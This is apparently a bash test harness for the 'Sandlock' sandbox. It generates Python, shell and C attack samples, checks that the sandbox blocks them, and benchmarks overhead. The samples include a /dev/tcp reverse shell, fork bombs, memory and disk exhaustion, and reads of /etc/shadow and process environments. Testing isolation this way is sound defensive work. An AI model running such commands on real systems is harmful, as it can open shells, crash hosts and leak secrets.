#!/bin/bash
# Sandlock Test Framework
# Usage: ./framework.sh [--run] [--benchmark] [--env userspace|lambda]

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"
RESULTS_DIR="$SCRIPT_DIR/results"
SANDLOCK="$ROOT_DIR/sandlock"
PY_SANDBOX="$ROOT_DIR/lang/python/sandbox.py"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Test counters
PASSED=0
FAILED=0
SKIPPED=0

# ============================================================
# Utility Functions
# ============================================================

log_pass() { echo -e "${GREEN}✓${NC} $1"; ((PASSED++)); }
log_fail() { echo -e "${RED}✗${NC} $1"; ((FAILED++)); }
log_skip() { echo -e "${YELLOW}○${NC} $1 (skipped)"; ((SKIPPED++)); }
log_info() { echo -e "  → $1"; }

# Run command and check if it fails (expected to be blocked)
expect_blocked() {
    local name="$1"
    shift
    if timeout 5 "$@" >/dev/null 2>&1; then
        log_fail "$name - NOT BLOCKED"
        return 1
    else
        log_pass "$name - blocked"
        return 0
    fi
}

# Run command and check if it succeeds
expect_success() {
    local name="$1"
    shift
    if timeout 5 "$@" >/dev/null 2>&1; then
        log_pass "$name - success"
        return 0
    else
        log_fail "$name - FAILED"
        return 1
    fi
}

# Benchmark a command (returns ms)
benchmark() {
    local runs="${1:-5}"
    shift
    local total=0
    
    for i in $(seq 1 $runs); do
        local start=$(date +%s%N)
        "$@" >/dev/null 2>&1 || true
        local end=$(date +%s%N)
        local elapsed=$(( (end - start) / 1000000 ))
        total=$((total + elapsed))
    done
    
    echo $((total / runs))
}

# ============================================================
# Test Generators
# ============================================================

generate_python_tests() {
    mkdir -p "$SCRIPT_DIR/attacks/python"
    
    # Network attacks
    cat > "$SCRIPT_DIR/attacks/python/net_tcp.py" << 'PY'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("8.8.8.8", 53))
print("TCP connected")
PY

    cat > "$SCRIPT_DIR/attacks/python/net_udp.py" << 'PY'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b"test", ("8.8.8.8", 53))
print("UDP sent")
PY

    cat > "$SCRIPT_DIR/attacks/python/net_http.py" << 'PY'
import urllib.request
urllib.request.urlopen("http://example.com", timeout=2)
print("HTTP success")
PY

    # Process attacks
    cat > "$SCRIPT_DIR/attacks/python/proc_fork.py" << 'PY'
import os
pid = os.fork()
if pid == 0:
    print("child")
else:
    print("parent")
PY

    cat > "$SCRIPT_DIR/attacks/python/proc_subprocess.py" << 'PY'
import subprocess
subprocess.run(["echo", "subprocess"])
PY

    cat > "$SCRIPT_DIR/attacks/python/proc_exec.py" << 'PY'
import os
os.execvp("echo", ["echo", "exec"])
PY

    cat > "$SCRIPT_DIR/attacks/python/proc_system.py" << 'PY'
import os
os.system("echo system")
PY

    # Filesystem attacks
    cat > "$SCRIPT_DIR/attacks/python/fs_read_passwd.py" << 'PY'
print(open("/etc/passwd").read()[:100])
PY

    cat > "$SCRIPT_DIR/attacks/python/fs_read_shadow.py" << 'PY'
print(open("/etc/shadow").read()[:100])
PY

    cat > "$SCRIPT_DIR/attacks/python/fs_write_etc.py" << 'PY'
open("/etc/test", "w").write("hacked")
PY

    cat > "$SCRIPT_DIR/attacks/python/fs_write_tmp.py" << 'PY'
open("/tmp/sandlock_test_ok", "w").write("ok")
print("wrote to /tmp")
PY

    cat > "$SCRIPT_DIR/attacks/python/fs_symlink.py" << 'PY'
import os
os.symlink("/etc/passwd", "/tmp/passwd_link")
PY

    # Low-level attacks
    cat > "$SCRIPT_DIR/attacks/python/low_ptrace.py" << 'PY'
import ctypes
libc = ctypes.CDLL(None)
libc.ptrace(0, 0, 0, 0)
PY

    cat > "$SCRIPT_DIR/attacks/python/low_syscall.py" << 'PY'
import ctypes
libc = ctypes.CDLL(None)
# Try to call fork via syscall
libc.syscall(57)  # __NR_fork on x86_64
PY

    cat > "$SCRIPT_DIR/attacks/python/low_mmap.py" << 'PY'
import mmap
import os
fd = os.open("/etc/passwd", os.O_RDONLY)
m = mmap.mmap(fd, 0, prot=mmap.PROT_READ)
print(m[:100])
PY

    # Resource attacks
    cat > "$SCRIPT_DIR/attacks/python/res_cpu.py" << 'PY'
while True:
    pass
PY

    cat > "$SCRIPT_DIR/attacks/python/res_memory.py" << 'PY'
x = []
while True:
    x.append([0] * 1000000)
PY

    cat > "$SCRIPT_DIR/attacks/python/res_disk.py" << 'PY'
with open("/tmp/bigfile", "w") as f:
    for i in range(10000000):
        f.write("x" * 1000)
PY

    cat > "$SCRIPT_DIR/attacks/python/res_forkbomb.py" << 'PY'
import os
while True:
    os.fork()
PY

    # Info leak attacks
    cat > "$SCRIPT_DIR/attacks/python/info_env.py" << 'PY'
import os
print(dict(os.environ))
PY

    cat > "$SCRIPT_DIR/attacks/python/info_proc.py" << 'PY'
print(open("/proc/self/environ").read())
PY

    # Valid code (should work)
    cat > "$SCRIPT_DIR/attacks/python/valid_math.py" << 'PY'
import math
print(math.sqrt(16))
PY

    cat > "$SCRIPT_DIR/attacks/python/valid_json.py" << 'PY'
import json
print(json.dumps({"a": 1}))
PY

    cat > "$SCRIPT_DIR/attacks/python/valid_compute.py" << 'PY'
result = sum(i*i for i in range(1000))
print(result)
PY
}

generate_shell_tests() {
    mkdir -p "$SCRIPT_DIR/attacks/shell"
    
    # Network
    echo 'curl -s http://example.com' > "$SCRIPT_DIR/attacks/shell/net_curl.sh"
    echo 'wget -q http://example.com -O /dev/null' > "$SCRIPT_DIR/attacks/shell/net_wget.sh"
    echo 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' > "$SCRIPT_DIR/attacks/shell/net_revshell.sh"
    
    # Process
    echo ':(){ :|:& };:' > "$SCRIPT_DIR/attacks/shell/proc_forkbomb.sh"
    echo 'python3 -c "print(1)"' > "$SCRIPT_DIR/attacks/shell/proc_exec_python.sh"
    
    # Filesystem
    echo 'cat /etc/passwd' > "$SCRIPT_DIR/attacks/shell/fs_read_passwd.sh"
    echo 'echo hacked > /etc/test' > "$SCRIPT_DIR/attacks/shell/fs_write_etc.sh"
    echo 'ln -s /etc/passwd /tmp/link' > "$SCRIPT_DIR/attacks/shell/fs_symlink.sh"
    
    # Valid
    echo 'echo hello' > "$SCRIPT_DIR/attacks/shell/valid_echo.sh"
    echo 'expr 1 + 1' > "$SCRIPT_DIR/attacks/shell/valid_math.sh"
}

generate_c_tests() {
    mkdir -p "$SCRIPT_DIR/attacks/c"
    
    # Network
    cat > "$SCRIPT_DIR/attacks/c/net_socket.c" << 'C'
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
int main() {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {.sin_family = AF_INET, .sin_port = htons(80)};
    inet_pton(AF_INET, "93.184.216.34", &addr.sin_addr);
    connect(fd, (struct sockaddr*)&addr, sizeof(addr));
    printf("connected\n");
    return 0;
}
C

    # Process
    cat > "$SCRIPT_DIR/attacks/c/proc_fork.c" << 'C'
#include <unistd.h>
#include <stdio.h>
int main() {
    if (fork() == 0) printf("child\n");
    else printf("parent\n");
    return 0;
}
C

    # Filesystem
    cat > "$SCRIPT_DIR/attacks/c/fs_read.c" << 'C'
#include <stdio.h>
int main() {
    FILE *f = fopen("/etc/passwd", "r");
    char buf[100];
    fread(buf, 1, 100, f);
    printf("%s", buf);
    return 0;
}
C

    # Low-level
    cat > "$SCRIPT_DIR/attacks/c/low_ptrace.c" << 'C'
#include <sys/ptrace.h>
#include <stdio.h>
int main() {
    long ret = ptrace(PTRACE_TRACEME, 0, 0, 0);
    printf("ptrace returned %ld\n", ret);
    return 0;
}
C

    # Valid
    cat > "$SCRIPT_DIR/attacks/c/valid_compute.c" << 'C'
#include <stdio.h>
#include <math.h>
int main() {
    double sum = 0;
    for (int i = 0; i < 1000; i++) sum += sqrt(i);
    printf("%.2f\n", sum);
    return 0;
}
C
}

# ============================================================
# Test Runners
# ============================================================

run_python_sandlock_tests() {
    echo ""
    echo "========================================"
    echo "Python + Sandlock (Userspace)"
    echo "========================================"
    
    local opts="--no-network --no-fork --clean-env --cpu 2 --mem 128"
    
    echo ""
    echo "--- Network Attacks ---"
    expect_blocked "TCP connect" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/net_tcp.py"
    expect_blocked "UDP send" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/net_udp.py"
    expect_blocked "HTTP request" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/net_http.py"
    
    echo ""
    echo "--- Process Attacks ---"
    expect_blocked "fork()" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/proc_fork.py"
    expect_blocked "subprocess" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/proc_subprocess.py"
    expect_blocked "os.system()" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/proc_system.py"
    
    echo ""
    echo "--- Filesystem Attacks ---"
    expect_success "read /etc/passwd (no landlock)" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/fs_read_passwd.py"
    expect_success "write /tmp" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/fs_write_tmp.py"
    expect_blocked "symlink" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/fs_symlink.py"
    
    echo ""
    echo "--- Low-level Attacks ---"
    expect_blocked "ptrace" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/low_ptrace.py"
    expect_blocked "direct syscall" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/low_syscall.py"
    
    echo ""
    echo "--- Resource Attacks ---"
    expect_blocked "CPU exhaustion" $SANDLOCK --cpu 1 -- python3 "$SCRIPT_DIR/attacks/python/res_cpu.py"
    expect_blocked "Memory bomb" $SANDLOCK --mem 32 -- python3 "$SCRIPT_DIR/attacks/python/res_memory.py"
    expect_blocked "Fork bomb" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/res_forkbomb.py"
    
    echo ""
    echo "--- Valid Code ---"
    expect_success "math operations" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/valid_math.py"
    expect_success "json processing" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/valid_json.py"
    expect_success "computation" $SANDLOCK $opts -- python3 "$SCRIPT_DIR/attacks/python/valid_compute.py"
}

run_python_sandbox_tests() {
    echo ""
    echo "========================================"
    echo "Python Sandbox (Lambda simulation)"
    echo "========================================"
    
    echo ""
    echo "--- Network Attacks ---"
    expect_blocked "TCP connect" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/net_tcp.py"
    expect_blocked "UDP send" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/net_udp.py"
    expect_blocked "HTTP request" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/net_http.py"
    
    echo ""
    echo "--- Process Attacks ---"
    expect_blocked "fork()" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/proc_fork.py"
    expect_blocked "subprocess" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/proc_subprocess.py"
    expect_blocked "os.system()" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/proc_system.py"
    
    echo ""
    echo "--- Filesystem Attacks ---"
    expect_blocked "read /etc/passwd" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/fs_read_passwd.py"
    expect_success "write /tmp" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/fs_write_tmp.py"
    expect_blocked "symlink" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/fs_symlink.py"
    
    echo ""
    echo "--- Low-level Attacks ---"
    expect_blocked "ptrace (no ctypes)" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/low_ptrace.py"
    expect_blocked "mmap" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/low_mmap.py"
    
    echo ""
    echo "--- Resource Attacks ---"
    expect_blocked "CPU exhaustion" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/res_cpu.py" --timeout 2
    expect_blocked "Memory bomb" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/res_memory.py" --memory 32
    
    echo ""
    echo "--- Valid Code ---"
    expect_success "math operations" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/valid_math.py"
    expect_success "json processing" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/valid_json.py"
    expect_success "computation" python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/valid_compute.py"
}

run_shell_sandlock_tests() {
    echo ""
    echo "========================================"
    echo "Shell + Sandlock (Userspace)"
    echo "========================================"
    
    local opts="--no-network --no-fork --clean-env --cpu 2 --mem 128"
    
    echo ""
    echo "--- Network Attacks ---"
    expect_blocked "curl" $SANDLOCK $opts -- sh "$SCRIPT_DIR/attacks/shell/net_curl.sh"
    
    echo ""
    echo "--- Filesystem Attacks ---"
    expect_success "read /etc/passwd (no landlock)" $SANDLOCK $opts -- sh "$SCRIPT_DIR/attacks/shell/fs_read_passwd.sh"
    expect_blocked "symlink" $SANDLOCK $opts -- sh "$SCRIPT_DIR/attacks/shell/fs_symlink.sh"
    
    echo ""
    echo "--- Valid Code ---"
    expect_success "echo" $SANDLOCK $opts -- sh "$SCRIPT_DIR/attacks/shell/valid_echo.sh"
    expect_success "math" $SANDLOCK $opts -- sh "$SCRIPT_DIR/attacks/shell/valid_math.sh"
}

# ============================================================
# Benchmark Runner
# ============================================================

run_benchmarks() {
    echo ""
    echo "========================================"
    echo "Performance Benchmarks"
    echo "========================================"
    
    echo ""
    echo "Configuration                              Avg Time"
    echo "-------------------------------------------+--------"
    
    # Baseline
    printf "%-43s %4dms\n" "Python baseline" $(benchmark 5 python3 "$SCRIPT_DIR/attacks/python/valid_compute.py")
    printf "%-43s %4dms\n" "Shell baseline" $(benchmark 5 sh "$SCRIPT_DIR/attacks/shell/valid_echo.sh")
    
    echo ""
    
    # Sandlock configurations
    printf "%-43s %4dms\n" "Sandlock minimal" $(benchmark 5 $SANDLOCK -- python3 "$SCRIPT_DIR/attacks/python/valid_compute.py")
    printf "%-43s %4dms\n" "Sandlock + rlimits" $(benchmark 5 $SANDLOCK --cpu 5 --mem 256 -- python3 "$SCRIPT_DIR/attacks/python/valid_compute.py")
    printf "%-43s %4dms\n" "Sandlock full" $(benchmark 5 $SANDLOCK --no-network --no-fork --clean-env --cpu 5 --mem 256 -- python3 "$SCRIPT_DIR/attacks/python/valid_compute.py")
    printf "%-43s %4dms\n" "Sandlock strict" $(benchmark 5 $SANDLOCK --strict --allow /tmp --allow /usr -- python3 "$SCRIPT_DIR/attacks/python/valid_compute.py")
    
    echo ""
    
    # Python sandbox
    printf "%-43s %4dms\n" "Python sandbox only" $(benchmark 5 python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/valid_compute.py")
    printf "%-43s %4dms\n" "Sandlock + Python sandbox" $(benchmark 5 $SANDLOCK --cpu 5 --mem 256 -- python3 $PY_SANDBOX "$SCRIPT_DIR/attacks/python/valid_compute.py")
}

# ============================================================
# Report Generator
# ============================================================

generate_report() {
    local report_file="$RESULTS_DIR/report_$(date +%Y%m%d_%H%M%S).md"
    mkdir -p "$RESULTS_DIR"
    
    cat > "$report_file" << EOF
# Sandlock Test Report

**Date:** $(date)
**Platform:** $(uname -a)
**Sandlock Version:** $($SANDLOCK --version 2>&1 || echo "N/A")

## Summary

- **Passed:** $PASSED
- **Failed:** $FAILED
- **Skipped:** $SKIPPED
- **Total:** $((PASSED + FAILED + SKIPPED))

## Test Results

$(cat "$RESULTS_DIR/test_output.txt" 2>/dev/null || echo "No test output")

## Benchmarks

$(cat "$RESULTS_DIR/benchmark_output.txt" 2>/dev/null || echo "No benchmark output")
EOF

    echo ""
    echo "Report saved to: $report_file"
}

# ============================================================
# Main
# ============================================================

main() {
    local run_tests=false
    local run_bench=false
    local env="userspace"
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            --run) run_tests=true ;;
            --benchmark) run_bench=true ;;
            --env) shift; env="$1" ;;
            --generate) 
                echo "Generating test cases..."
                generate_python_tests
                generate_shell_tests
                generate_c_tests
                echo "Done. Test cases in $SCRIPT_DIR/attacks/"
                exit 0
                ;;
            --help)
                echo "Usage: $0 [options]"
                echo "  --generate     Generate attack test cases"
                echo "  --run          Run security tests"
                echo "  --benchmark    Run performance benchmarks"
                echo "  --env ENV      Environment: userspace|lambda"
                exit 0
                ;;
        esac
        shift
    done
    
    # Default: just generate
    if ! $run_tests && ! $run_bench; then
        echo "Use --run to run tests, --benchmark for benchmarks"
        echo "Use --generate to create test cases"
        exit 0
    fi
    
    mkdir -p "$RESULTS_DIR"
    
    if $run_tests; then
        {
            if [[ "$env" == "userspace" ]]; then
                run_python_sandlock_tests
                run_shell_sandlock_tests
            fi
            run_python_sandbox_tests
            
            echo ""
            echo "========================================"
            echo "SUMMARY: Passed=$PASSED Failed=$FAILED Skipped=$SKIPPED"
            echo "========================================"
        } | tee "$RESULTS_DIR/test_output.txt"
    fi
    
    if $run_bench; then
        run_benchmarks | tee "$RESULTS_DIR/benchmark_output.txt"
    fi
    
    generate_report
}

main "$@"
